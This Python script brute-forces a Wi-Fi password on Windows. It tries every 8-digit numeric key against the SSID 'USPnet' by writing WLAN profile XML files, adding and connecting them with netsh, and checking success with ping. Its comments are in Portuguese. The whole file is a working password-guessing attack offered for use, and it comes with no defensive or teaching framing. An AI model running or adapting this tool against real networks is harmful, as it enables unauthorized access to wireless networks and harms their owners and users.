from subprocess import Popen, STDOUT, PIPE
from time import sleep


def generate_xml_profile(xml_file, server_name, password, authentication, encryption):
	
	xml = open(xml_file, "w")
	
	string =  "<?xml version=\"1.0\"?>\n"
	string += "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n"
	string += "\t<name>%s</name>\n" %server_name
	string += "\t<SSIDConfig>\n"
	string += "\t\t<SSID>\n"
	string += "\t\t\t<name>%s</name>\n" %server_name
	string += "\t\t</SSID>\n"
	string += "\t</SSIDConfig>\n"
	string += "\t<connectionType>ESS</connectionType>\n"
	string += "\t<connectionMode>manual</connectionMode>\n"
	string += "\t<MSM>\n"
	string += "\t\t<security>\n"
	string += "\t\t\t<authEncryption>\n"
	string += "\t\t\t\t<authentication>%s</authentication>\n" %authentication
	string += "\t\t\t\t<encryption>%s</encryption>\n" %encryption
	string += "\t\t\t\t<useOneX>false</useOneX>\n"
	string += "\t\t\t</authEncryption>\n"
	string += "\t\t\t<sharedKey>\n"
	string += "\t\t\t\t<keyType>passPhrase</keyType>\n"
	string += "\t\t\t\t<protected>false</protected>\n"
	string += "\t\t\t\t<keyMaterial>%s</keyMaterial>\n" %password
	string += "\t\t\t</sharedKey>\n"
	string += "\t\t</security>\n"
	string += "\t</MSM>\n"
	string += "\t<MacRandomization xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v3\">\n"
	string += "\t\t<enableRandomization>false</enableRandomization>\n"
	string += "\t</MacRandomization>\n"
	string += "</WLANProfile>"
	
	xml.write(string)
	xml.close()


def brute_force(xml_file, server_name, authentication, encryption, prompt_encoding):
	
	password = ""
	
	for i in range (0, 100000000):
		
		password = str(i).zfill(8)
		print("Teste para a seguinte senha: " + password)
		
		#Criando arquivo de perfil de rede (com a senha atual de 8 digitos)
		generate_xml_profile(xml_file, server_name, password, authentication, encryption)
		
		#Adicionando novo perfil de rede no sistema
		command = "netsh wlan add profile filename=\"%s\"" %xml_file
		handle = Popen(command, stdout=PIPE, stdin=PIPE, shell=True,  stderr=STDOUT)
		
		#Conectando com o perfil criado
		command = "netsh wlan connect %s\n" %server_name
		handle = Popen(command, stdout=PIPE, stdin=PIPE, shell=True,  stderr=STDOUT)
		
		#Verificando se a conexão foi bem-sucedida
		#command = "ping 172.217.30.67"
		command = "ping www.pudim.com.br"
		handle = Popen(command, stdout=PIPE, stdin=PIPE, shell=True,  stderr=STDOUT)
		output = ((handle.communicate()[0]).decode(prompt_encoding))
		
		if("A solicitação ping não pôde encontrar o host" in output): continue
		if("Host de destino inacessível" in output): continue
		if("Falha geral" in output): continue
		
		else: break
		
	return password



if __name__ == "__main__":
	
	xml_file = "C:\\Users\\PC\\Desktop\\wifiXML.xml"
	
	server_name = "USPnet"
	
	#authentication = "open"
	#authentication = "WPA2PSK"
	authentication = "WPS"
	
	#encryption = "none"
	encryption = "AES"
	
	prompt_encoding = "850" #Exemplos: "utf8", "latin1"
	
	password = brute_force(xml_file, server_name, authentication, encryption, prompt_encoding)
	print(password)